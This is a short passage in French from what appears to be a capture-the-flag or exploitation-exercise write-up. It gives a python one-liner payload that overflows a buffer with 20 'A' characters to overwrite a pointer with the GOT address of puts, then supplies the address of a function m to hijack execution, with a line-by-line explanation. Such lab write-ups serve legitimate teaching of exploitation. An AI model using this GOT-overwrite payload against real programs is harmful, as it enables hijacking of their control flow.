...
pour trouver l'addresse dans la GOT objdump -R.

### Exploitation


(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
Le premier bloc imprime 20 lettres "A" pour saturer la mémoire allouée et déborder jusqu'au pointeur, puis l'écrase avec l'adresse de puts dans la table GOT (0x08049928)
Le second bloc transmet l'adresse de la fonction <m> (0x080484f4)
